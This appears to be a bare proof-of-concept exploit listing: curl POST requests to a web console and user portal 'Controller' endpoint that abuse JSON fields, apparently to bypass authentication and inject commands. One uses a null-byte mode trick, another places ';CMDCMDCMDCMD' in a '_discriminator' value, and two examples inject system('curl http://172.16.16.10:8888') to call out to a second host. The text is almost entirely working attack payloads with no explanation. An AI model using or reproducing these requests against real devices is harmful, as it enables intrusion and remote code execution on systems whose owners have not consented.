1040:
```
curl --connect-timeout 5 -X POST -k -i 'https://x.x.x.x:4444/webconsole/Controller' --data 'mode=151&json={"username"%3a"admin","password"%3a"pw","languageid"%3a"1","browser"%3a"Chrome_101","captcha"%3a"gn2x53","accessaction"%3a1,+"mode\u0000ef"%3a716}&__RequestType=ajax&t=1655987625589' --cookie 'JSESSIONID=xxxxxxx'
```

3236:
```
curl --connect-timeout 5 -X POST -k -i 'https://x.x.x.x/userportal/Controller' --data 'mode=451&json={"username"%3a"admin","password"%3a"pw","value"%3a"value","_discriminator"%3a{"value"%3a";CMDCMDCMDCMD"}}'
```
example1:
```
curl --connect-timeout 5 -X POST -k -i 'https://172.16.16.16:4444/webconsole/Controller' --data 'mode=151&json={"username"%3a"admin","password"%3a"pw","languageid"%3a"1","browser"%3a"Chrome_101","captcha"%3a"gn2x53","accessaction"%3a1,"value"%3a"value","_discriminator"%3a{"value"%3a";system(\"curl http://172.16.16.10:8888\")"}}'
```
example2:
```
curl --connect-timeout 5 -X POST -k -i 'https://172.16.16.16/userportal/Controller' --data 'mode=451&json={"username"%3a"admin","password"%3a"pw","value"%3a"value","_discriminator"%3a{"value"%3a";system(\"curl http://172.16.16.10:8888\")"}}'
```
